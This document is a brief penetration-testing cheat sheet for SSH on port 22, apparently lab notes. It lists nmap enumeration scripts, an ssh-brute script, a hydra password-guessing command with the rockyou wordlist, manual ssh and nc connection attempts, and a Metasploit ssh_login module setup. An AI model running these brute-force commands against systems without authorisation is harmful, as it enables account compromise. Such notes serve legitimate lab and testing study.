# **SSH**

## **Secure Shell 22**

--------------------------------------------------------------------

### Nmap Scripts

```
$ nmap 0.0.0.0 -p 22 —script ssh2-enum-algos

$ nmap 0.0.0.0 -p 22 —script ssh-hostkey —script-args ssh_hostkey=full 

$ nmap 0.0.0.0 -p 22 —script ssh-auth-methods —script-args=”ssh.user=student(use user)”

$ nmap 0.0.0.0 -p 22 —script ssh-brute —script-args userdb=/root/user
```

--------------------------------------------------------------------

### BRUTEFORCE

```
$ hydra -l student -P /usr/share/wordlists/rockyou.txt ssh
```

--------------------------------------------------------------------

### Trying login

```
$ ssh root@0.0.0.0 

$ nc 0.0.0.0 22
```

--------------------------------------------------------------------

### Metasploit

```
$ msfconsole 
> use auxiliary/scanner/ssh/ssh_login
> set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
```

--------------------------------------------------------------------